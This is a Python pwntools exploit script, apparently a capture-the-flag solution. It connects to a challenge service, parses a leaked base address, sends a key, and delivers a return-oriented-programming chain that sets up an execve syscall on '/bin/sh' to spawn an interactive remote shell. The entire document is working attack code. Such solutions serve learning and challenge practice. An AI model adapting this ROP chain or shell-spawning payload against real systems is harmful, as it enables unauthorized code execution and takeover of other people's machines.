import argparse
import os

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

N = 256



context.log_level='DEBUG'

key = b'AAAAAAAAAAAAAAA'



parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
#r = process('handout/challenge')
#r = gdb.debug('challenge/build/challenge')

addr_leak = r.recvline_contains(b'The toolbox: ')
base_addr = int(addr_leak.decode().strip().split(': ', 1)[1], 16)
base=base_addr
log.info('Base addr: %x', base_addr)

r.recvuntil(b'Please provide a key: ')
r.send(key)

r.recvuntil(b'Give me some of that sweet ROP: ')



payload = (b''
  + p64(base+0x4fdc4c) # mov rdi, rsp ; ret
  + p64(base+0x00000000000026ef) # pop rdx ; ret
  + p64(0x80)
  + p64(base+0x0000000000056938) # add dil, dl ;
  + p64(base+0x00000000000026ef) # pop rdx ; ret
  + p64(0) # rdx
  + p64(base+0x000000000000153f) # pop rax ; ret
  + p64(59) # rax
  + p64(base+0x000000000000007f) # pop rsi ; ret
  + p64(0) # rsi
  + p64(base+0x0000000000012764) # syscall
  + p64(1)
  + p64(2)
  + p64(3)
  + p64(4)
  + p64(5)
  + p64(6)
  + b'/bin/sh\0'
  + p64(8)
  + p64(9)
  + p64(10)
  + p64(11)
  + p64(12)
  + p64(13)
  + p64(14)
  + p64(15)
  + p64(16)
  + p64(17)
  + p64(18)
  + p64(19)
  + p64(20)
  + p64(21)
  + p64(22)
  + p64(23)
  + p64(24)
  + p64(25)
  + p64(26)
  + p64(27)
  + p64(28)
  + p64(29)
)


r.send(payload + b'\x00' * (0x1000-len(payload)))

r.interactive()

